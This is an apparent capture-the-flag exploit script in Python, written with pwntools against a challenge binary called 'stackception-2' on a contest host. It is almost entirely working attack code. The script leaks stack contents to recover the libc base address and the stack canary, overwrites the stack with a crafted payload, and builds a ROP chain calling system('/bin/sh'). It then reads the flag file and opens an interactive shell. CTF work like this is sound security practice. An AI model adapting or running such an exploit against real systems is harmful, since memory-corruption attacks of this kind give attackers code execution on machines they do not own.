#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 6042 ./stackception-1
from pwn import *
from textwrap import dedent

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./stackception-2")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "challs.polygl0ts.ch"
port = int(args.PORT or 6043)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
else:
    libc = ELF("libc.so.6")


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(["setarch", "-R", exe.path] + argv, *a, **kw)
        #return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
set radix 16
b *(0x0000555555554000 + 0x1f55)
continue
x /32gx $rbp-0x30
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled

leaks = 652

# This is the offset for a leaked return address in the callstack to "write"
offset_into_libc = 0x93975

asm = dedent(
    """
             main:
             pop
             pop
             """
).strip()
asm += "\n"
asm += "write\n" * leaks
asm += dedent(
    """
             sploit:
             """
).strip()
asm += "\n"
asm += "read\n" * 300
asm += "jmp sploit\n"
asm += "push 1\n"
asm += "exit\n"


if args.LOCAL:
    with open("/tmp/exp.asm", "w") as f:
        f.write(asm.strip())
    process(["./stackception-asm", "/tmp/exp.asm", "/tmp/exp.bin"]).wait()
    io = start(["/tmp/exp.bin"])
else:
    io = start()
    asm_prepared = asm.strip().replace(" ", "_").replace("\n", "|").encode()
    io.recvuntil(b"becomes 'main:|push_5|call_main'")
    io.sendline(asm_prepared)
    io.recvline()

# First, leak stuff from the stack to find libc base by going down the stack
# (i.e., higher address, i.e., old stack frames from previous function calls)
stack_contents = []
for _ in range(leaks):
    leak_bytes = io.recv(4)
    leak = u32(leak_bytes)
    info(hex(leak))
    if leak & 0x00000fff == offset_into_libc & 0x00000fff:
        leak_addr = u64(leak_bytes + stack_contents[-1])
        info("leak: " + hex(leak_addr))
        libc_base = leak_addr - offset_into_libc
        info("libc base: " + hex(libc_base))
        libc.address = libc_base
    stack_contents += [leak_bytes]

# Last leaked thing should be the canary
canary = u64(stack_contents[-1] + stack_contents[-2])
info("canary: " + hex(canary))

# Now overwrite everything (i.e., our stack and then also the program!!!) with
# reads (opcode 8) to read in more from stdin (required because we have a limit
# of 1024 instructions in the assembler)
payload = p32(8) * 3080  # read
payload += p64(canary) * 70 # fill with canaries up to ret_addr

# Finally, dump rop chain
rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh"))
for _ in range(21):
    rop.raw(rop.ret)
rop.call('system', [binsh])
info(rop.dump())
payload += rop.chain()
payload += b"\n" * 200
io.send(payload)
io.sendline(b"cat flag.txt")

# Now we should have a shell
io.interactive()
